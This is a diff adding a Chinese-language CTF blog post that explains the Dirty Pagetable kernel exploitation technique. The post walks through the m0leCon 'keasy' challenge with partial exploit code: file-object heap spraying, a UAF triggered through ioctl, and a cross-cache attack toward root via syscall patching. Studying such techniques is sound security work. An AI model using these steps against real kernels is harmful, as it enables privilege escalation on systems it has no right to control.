@@ -1,0 +1,1149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="henry">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2024/04/10/dirty-pagetable-study/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="Dirty Pagetable 学习 &amp; 例题Reference：https:&#x2F;&#x2F;yanglingxi1993.github.io&#x2F;dirty_pagetable&#x2F;dirty_pagetable.html  https:&#x2F;&#x2F;ptr-yudai.hatenablog.com&#x2F;entry&#x2F;2023&#x2F;12&#x2F;08&#x2F;093606  1. Dirty Pagetable 介绍​	顾名思义这是一个与页表">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dirty Pagetable 学习 &amp; 例题">
+<meta property="og:url" content="http://example.com/2024/04/10/Dirty-pagetable-study/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Dirty Pagetable 学习 &amp; 例题Reference：https:&#x2F;&#x2F;yanglingxi1993.github.io&#x2F;dirty_pagetable&#x2F;dirty_pagetable.html  https:&#x2F;&#x2F;ptr-yudai.hatenablog.com&#x2F;entry&#x2F;2023&#x2F;12&#x2F;08&#x2F;093606  1. Dirty Pagetable 介绍​	顾名思义这是一个与页表">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-08_21-13-06.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_19-51-08.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_19-54-15.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_20-08-15.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_20-23-20.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_20-32-12.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_20-40-31.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_20-56-04.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_21-01-00.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_21-06-17.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_21-08-03.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_21-42-29.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_21-49-35.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_21-50-19.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_21-58-29.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_21-59-39.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_22-07-04.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_22-10-00.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-04-10_22-18-26.png">
+<meta property="article:published_time" content="2024-04-10T15:06:34.258Z">
+<meta property="article:modified_time" content="2024-04-10T15:11:24.080Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="cache">
+<meta property="article:tag" content="uaf">
+<meta property="article:tag" content="Cross-Cache attack">
+<meta property="article:tag" content="pagetable">
+<meta property="article:tag" content="dma_buf_heap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Snipaste_2024-04-08_21-13-06.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/icon.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/icon.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Dirty Pagetable 学习 &amp; 例题 -
+        
+        Henry Martin
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-we3z86.webp","dark":"/images/wallhaven-6degr6.webp"},"title":"Welcome To Henry's Blog","subtitle":{"text":["a pwner from polaris"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/henrymartin262","instagram":"https://instagram.com","zhihu":"https://www.zhihu.com/","twitter":"https://twitter.com","email":"1551022913@qq.cmo"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"Something Just Like This","artist":"Coldplay","url":"https://evan.beee.top/music/Something%20Just%20Like%20This%20-%20The%20Chainsmokers%E3%80%81Coldplay.mp3","cover":"https://evan.beee.top/music/covers/Something_Just_Like_This.png"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.6","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"About":{"icon":"fa-regular fa-user","submenus":{"Links":"/links/","Github":"https://github.com/henrymartin262","Blog":"https://henrymartin262.github.io"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/11/24 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Henry Martin
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/tags"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-tags"></i>
+                                        
+                                        TAGS
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/links/">LINKS
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories/"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/tags"  >
+                             
+                                
+                                    <i class="fa-regular fa-tags"></i>
+                                
+                                TAGS
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/links/">LINKS</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Dirty Pagetable 学习 &amp; 例题</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/henry.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">henry</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-04-10 23:06:34</span>
+        <span class="mobile">2024-04-10 23:06:34</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-04-10 23:11:24</span>
+            <span class="mobile">2024-04-10 23:11:24</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/CTF/PWN/">PWN</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/CTF/PWN/linux-kernel/">linux kernel</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/kernel/">kernel</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/heap/">heap</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/cache/">cache</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/uaf/">uaf</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Cross-Cache-attack/">Cross-Cache attack</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/pagetable/">pagetable</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/dma-buf-heap/">dma_buf_heap</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="Dirty-Pagetable-学习-例题"><a href="#Dirty-Pagetable-学习-例题" class="headerlink" title="Dirty Pagetable 学习 &amp; 例题"></a>Dirty Pagetable 学习 &amp; 例题</h1><p><strong>Reference：</strong><br><a class="link"   target="_blank" rel="noopener" href="https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html" >https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606" >https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="1-Dirty-Pagetable-介绍"><a href="#1-Dirty-Pagetable-介绍" class="headerlink" title="1. Dirty Pagetable 介绍"></a>1. Dirty Pagetable 介绍</h2><p>​	顾名思义这是一个与页表相关的利用，该技巧可以基于堆漏洞完成利用，简单来说该技巧就是去操纵用户页表，通过这种方法可以让攻击者获取到强原语：<strong>任意物理地址读写</strong>。</p>
+<p>该方法有以下优点：</p>
+<ul>
+<li>基于数据（data-only exploitation）就可以完成利用，不同于其他的传统的劫持内核控制流的方法，这种方法能够绕过 CFI、KASLR、SMAP&#x2F;PAN 等等保护。</li>
+<li>该技巧可以用在最新的 linux 内核上。</li>
+<li>该技巧可以显著提高基于堆漏洞利用成功的效率。</li>
+</ul>
+<h2 id="2-Dirty-Pagetable-原理步骤"><a href="#2-Dirty-Pagetable-原理步骤" class="headerlink" title="2. Dirty Pagetable 原理步骤"></a>2. Dirty Pagetable 原理步骤</h2><p>​	这里结合一个 UAF 来进行说明利用方式。</p>
+<ol>
+<li><strong>在一个包含 uaf object 的 victim slab 上触发 UAF</strong>，并且将该 slab 其他 object 释放从而让其被页分配器回收。</li>
+<li>使用用户页表<strong>占用上一步释放的</strong> victim slab，从下图中可以看到 pte 页表项占用了我们上一步释放的 victim object（UAF 堆块）。</li>
+</ol>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-08_21-13-06.png"
+                      alt="nipaste_2024-04-08_21-13-0"
+                ></p>
+<ol>
+<li><p>这一步我们就可以<strong>建立写原语去修改页表项</strong></p>
+<p>通常来说这一步是最困难的，因为在真实环境中我们想通过一个 UAF，去建立写原语修改它是复杂的，但是这篇文章中作者通过 file UAF 和 pid UAF 给了我们如何将这种 UAF 漏洞去改变 PTE。</p>
+</li>
+<li><p>修改 PTE 给内核打<strong>“补丁”</strong></p>
+<p>为完成提权我们可以 patch 几个系统调用，例如 <code>setresuid()</code>、<code>setresgid()</code>等，我们可以从非特权进程中直接执行它们进行提权（参考我在 n1ctf pramoon 中博客的做法）。再开了 SELINUX 时，也可以对 SELINUX 中的变量进行 patch 使它的功能失效。</p>
+</li>
+<li><p><strong>enjoy your root！</strong></p>
+</li>
+</ol>
+<h2 id="3-通过-file-UAF-利用-Dirty-Pagetable"><a href="#3-通过-file-UAF-利用-Dirty-Pagetable" class="headerlink" title="3. 通过 file UAF 利用 Dirty Pagetable"></a>3. 通过 file UAF 利用 Dirty Pagetable</h2><p>原文中作者提出了三种 file uaf 的利用方式：</p>
+<p><strong>第一种</strong></p>
+<p>通过具有高优先级文件的 file object 去<strong>占用</strong>我们释放的 victim file object，比如  <code> /etc/crontab</code>，在这之后我们可以通过写 victim object 去提权获取 root。这种方法的<strong>缺点</strong>在于：</p>
+<ul>
+<li>对竞争的要求比较高需要一些运气</li>
+<li>由于安卓上大多数高优先级文件都<strong>位于只读文件系统</strong>中，所以不能通过写原语来提权</li>
+<li>这种方法<strong>不能够用来容器逃逸</strong></li>
+</ul>
+<p><strong>第二种</strong></p>
+<p>第二种方法是<strong>攻击系统库和可执行程序的页缓存</strong>，可以向程序中<strong>注入恶意代码</strong>，类似与 Dirty Pipe 的利用手法，这种方法的最大优点是比较稳定，不要条件竞争就可以提权。但这种方法依然很难用来解决第一种方法中提到的后两个问题，而且该方法不能被用来其他类型的 UAF 漏洞。</p>
+<p><strong>第三种</strong></p>
+<p>第三种方法是基于   <code>cross-cache attach</code> 的视角来进行利用，不过要完成利用得先绕过 <strong>KASLR</strong>。</p>
+<h2 id="4-例题-m0leCon-Finals-2023-keasy"><a href="#4-例题-m0leCon-Finals-2023-keasy" class="headerlink" title="4. 例题 m0leCon Finals 2023-keasy"></a>4. 例题 m0leCon Finals 2023-keasy</h2><p>原文作者是通过 <strong>CVE-2022-28350</strong> 来实现的，但由于在网上没有找到关于该漏洞的详细介绍，也没有详细的 poc，所以对于一个 kernel 菜鸟来说想复现已经结束咧，但针对这种利用技巧，m0lecon 的出题人已经为我们准备好了一个题目 keasy， 这道题不得不说又涨了波思路，感觉这种上过 blackhat 的技巧都很实用。</p>
+<p>话不多说，我们直接开始吧！</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -cpu qemu64,+smep,+smap,+rdrand \</span><br><span class="line">    -m 4G \</span><br><span class="line">    -smp 4 \</span><br><span class="line">    -initrd rootfs.cpio.gz \</span><br><span class="line">    -hda flag.txt \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 quiet loglevel=3 oops=panic panic_on_warn=1 panic=-1 pti=on page_alloc.shuffle=1 kaslr&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -nographic \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure></div>
+
+<p>启动脚本如上所示，与我们常见的 kernel 题大差不差，该开的保护也都开了，不做过多说明。</p>
+<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>​	这道题源码其实很简单</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_19-51-08.png"
+                      alt="nipaste_2024-04-10_19-51-0"
+                ></p>
+<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>​	漏洞点就在于上面代码中在 copy 失败后会直接 fput(v4) 释放 inode 对象。</p>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_19-54-15.png"
+                      alt="nipaste_2024-04-10_19-54-1"
+                ></p>
+<h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><h4 id="Cross-Cache-Attack"><a href="#Cross-Cache-Attack" class="headerlink" title="Cross-Cache Attack"></a>Cross-Cache Attack</h4><p>由于 file object 和 page table 所在的 kmem_cache 之间是独立的，所以说我们想仅在一个 slab 内完成 UAF 是不现实的，因此这里需要借助 Cross-Cache Attack 完成利用，关于这个技巧可以参考<a class="link"   target="_blank" rel="noopener" href="https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/" >VERITAS501师傅 –&gt; Cross Cache Attack <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，里面讲的很明白。</p>
+<h4 id="堆喷-file-object-get-victim-fd"><a href="#堆喷-file-object-get-victim-fd" class="headerlink" title="堆喷 file object &amp; get victim fd"></a>堆喷 file object &amp; get victim fd</h4><p>为完成 Cross-Cache Attack 的需要，我们需要先进行堆喷 file object，先让 file object 占据足够多的 slab（一个页大小），步骤如下。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    *   STEP.1 Spray the filp objects</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">output_msg (<span class="string">&quot;STEP.1 Spray file structs completely!&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; FILE_SPRAYNUM/<span class="number">2</span>; i++)&#123;</span><br><span class="line">    spray_fd[i] = open(<span class="string">&quot;/&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (spray_fd[i] &lt; <span class="number">0</span>) err_msg(<span class="string">&quot;fail open /.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// get uaf filp struct when the operation of copy_to_user failure</span></span><br><span class="line">uaf_fd = spray_fd[FILE_SPRAYNUM/<span class="number">2</span><span class="number">-1</span>] + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (ioctl(keasy_fd, <span class="number">0</span>, <span class="number">0xdeadbeef</span>) == <span class="number">0</span>) err_msg(<span class="string">&quot;fail uaf&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = FILE_SPRAYNUM/<span class="number">2</span>; i &lt; FILE_SPRAYNUM; i++)&#123;</span><br><span class="line">    spray_fd[i] = open(<span class="string">&quot;/&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (spray_fd[i] &lt; <span class="number">0</span>) err_msg(<span class="string">&quot;fail open /.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>为更进一步理解，这里用<strong>参考1 Nicolas Wu</strong> 的图说明（画的很好，懒得自己画了，只能盗大佬的图了）。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_20-08-15.png"
+                      alt="nipaste_2024-04-10_20-08-1"
+                ></p>
+<p>可以看到在经过上面的过程后 victim fd 指向我们前面所说的 UAF file object 对象，下图为调试过程中正要释放时的 file object 的数据，记住这个 <code>f_count</code> 待会会用到。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_20-23-20.png"
+                      alt="nipaste_2024-04-10_20-23-2"
+                ></p>
+<h4 id="回收-victim-slab-到-page-allocator"><a href="#回收-victim-slab-到-page-allocator" class="headerlink" title="回收 victim slab 到 page allocator"></a>回收 victim slab 到 page allocator</h4><p>这一步依然是完成 Cross-Cache Attack 的过程，将之前分配的所有 slab 全部释放，其中包含有 victim file object 的 slab 将会被 page allocator 回收。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">output_msg (<span class="string">&quot;STEP.2 Release all the filp struct&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; FILE_SPRAYNUM; i++)&#123;</span><br><span class="line">	close(spray_fd[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="通过-pte-占用-victim-slab"><a href="#通过-pte-占用-victim-slab" class="headerlink" title="通过 pte 占用 victim slab"></a>通过 pte 占用 victim slab</h4><p>我们先通过 mmap 映射得到对应的<strong>虚拟地址</strong>，这一步内核并不会直接我们分配对应的<strong>物理地址空间</strong>，而是在执行 <code>*(char *)(spray_page[i] + j*0x1000) = &#39;A&#39; + j;</code> 后，会<strong>触发缺页</strong>，此时内核才会为我们<strong>真正分配</strong>虚拟地址对应的物理地址<strong>空间</strong>，并<strong>填充页表项</strong>，建立虚拟地址和物理地址之间的映射关系。</p>
